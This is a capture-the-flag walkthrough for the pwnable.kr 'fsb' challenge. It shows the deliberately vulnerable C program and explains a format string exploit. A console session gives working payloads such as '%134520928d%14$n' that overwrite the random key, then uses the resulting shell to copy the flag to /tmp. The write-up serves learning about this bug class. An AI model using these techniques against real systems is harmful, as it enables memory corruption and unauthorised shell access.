---
title: Fsb - Pwnable.kr
date: 2016-09-06
categories: [Writeups, Pwnable.kr]
tags: ['Format string']
image:
    path: "/unsorted/pwnablekr.png"

---

The format string bug is one of the oldest bugs/vulnerabilities related to the
standard lib. It involves a wrong use of an user-controlled string which is
passed to a function that makes use of format strings (usually printf) and 
hence allows to easily read/write data.

Here is a good resource (in french) to learn more about this vulnerability:

- <https://www.bases-hacking.org/format-strings.html>


In this challenge we need to exploit the program below:

```c
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
    char* args[]={"/bin/sh", 0};
    int i;

    char*** pargv = &argv;
    char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
    *pargv=0;
    *penvp=0;

    for(i=0; i<4; i++){
        printf("Give me some format strings(%d)\n", i+1);
        read(0, buf, 100);
        printf(buf);
    }

    printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);
        if(pw == key){
                printf("Congratz!\n");
                execve(args[0], args, 0);
                return 0;
        }

        printf("Incorrect key \n");
    return 0;
}

int main(int argc, char* argv[], char** envp){

    int fd = open("/dev/urandom", O_RDONLY);
    if( fd==-1 || read(fd, &key, 8) != 8 ){
        printf("Error, tell admin\n");
        return 0;
    }
    close(fd);

    alloca(0x12345 & key);

    fsb(argv, envp); // exploit this format string bug!
    return 0;
}
```

Let's jump directly to the vulnerable function `fsb`. What it does is it overwrites
the content of `argv` and `envp` with zeros, then it reads four strings of max
100 chars from stdin into `buf` and writes them using `printf`, that's the 
vulnerable part. Finally, it asks the user for a key and if the one provided by
the user matches the value of the global variable `key` is good, we get a
shell.

The variable `key` is initialized by the function `main` with random values.

There are various ways this challenge could be passed. We could try to figure
out how far is the reserved space of the function `main` from the function
`fsb` on the stack or we could probably overwrite a return address or an entry
of the GOT/PLT table to execute a shellcode or perform a ret2libc exploit.
I will go for the easiest one: read or write directly the value of `key`.

For this we need to have the address of `key` somewhere on the stack which value
is `0x804a060`, unfortunately there is no such value on the stack, but we can find
a way to write it.

The variables `pargv` and `penvp` are pointers to the arguments `argv` and `envp`,
this means that we can use one of them to change the value of one of `argv` or `envp`.
A bit of math tells us that `pargv` can be reached if we reference it as the
14th argument of `printf`, and `argv` can be referenced as the 20th argument.
Thus we can write the value `0x804a060` into `argv` using this format string:
`%134520928d%14$n` (134520928 is the decimal value for 0x804a060).

Now we can read/write the value of `key`. Let's overwrite it with the value 0:
`%20$n`. The type of the global variable `key` is `unsigned long long` in our 
case this means that it has eight bytes size, then we need to overwrite the next
four bytes at address `0x804a064`. The procedure is exactly the same.

The format string we are using will print out a pretty big amount of characters,
so in order to make things way faster we can redirect the output to a file.
Lets redirect to `/dev/null` or we will get a `File size limit exceeded` error.

    ::console
    fsb@ubuntu:~$ ./fsb > /dev/null
    %134520928d%14$n
    %20$n
    %134520932d%14$n
    %20$n
    0
    cat flag > /tmp/fsb_flag_werew 
    chmod 666 /tmp/fsb_flag_werew


    fsb@ubuntu:~$ cat /tmp/fsb_flag_werew
    Have *** **** *** ** ****** **  utilizing [n] format character?? :(

